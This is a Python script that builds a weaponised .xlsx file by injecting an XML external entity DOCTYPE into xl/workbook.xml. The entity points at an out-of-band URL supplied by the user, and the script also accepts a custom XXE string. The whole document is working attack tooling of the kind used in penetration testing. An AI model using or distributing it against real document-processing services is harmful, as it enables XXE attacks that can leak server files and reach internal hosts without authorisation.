#!/usr/bin/env python3
import argparse
import os
import shutil
import zipfile

def unzip_xlsx(file_path):
    with zipfile.ZipFile(file_path, 'r') as zip_ref:
        dir_path = os.path.splitext(file_path)[0]
        zip_ref.extractall(dir_path)
    return dir_path

def append_to_workbook_xml(dir_path, xxe, url):
    xml_path = os.path.join(dir_path, 'xl', 'workbook.xml')
    with open(xml_path, 'r') as f:
        xml_content = f.readlines()
    if xxe:
        xml_content.insert(1, f"{xxe}\n")
    else:
        xml_content.insert(1, f"<!DOCTYPE ShiftSecurity [ <!ENTITY xxe SYSTEM '{url}'> ]>\n")
    with open(xml_path, 'w') as f:
        f.writelines(xml_content)

def zip_directory(dir_path, output_path):
    output = shutil.make_archive(output_path, 'zip', dir_path)
    os.rename(output, output_path)

def main():
    parser = argparse.ArgumentParser(description='Append string to xl/workbook.xml in a .xlsx file')
    parser.add_argument('-f','--file', help='Input .xlsx file path', required=True)
    parser.add_argument('-o','--output', help='Output .xlsx file path', required=True)
    parser.add_argument('--xxe', help='Custom XXE string')
    parser.add_argument('-u','--url', help='Out of band url')
    args = parser.parse_args()

    dir_path = unzip_xlsx(args.file)
    append_to_workbook_xml(dir_path, args.xxe, args.url)
    zip_directory(dir_path, args.output)

    shutil.rmtree(dir_path)

if __name__ == '__main__':
    main()
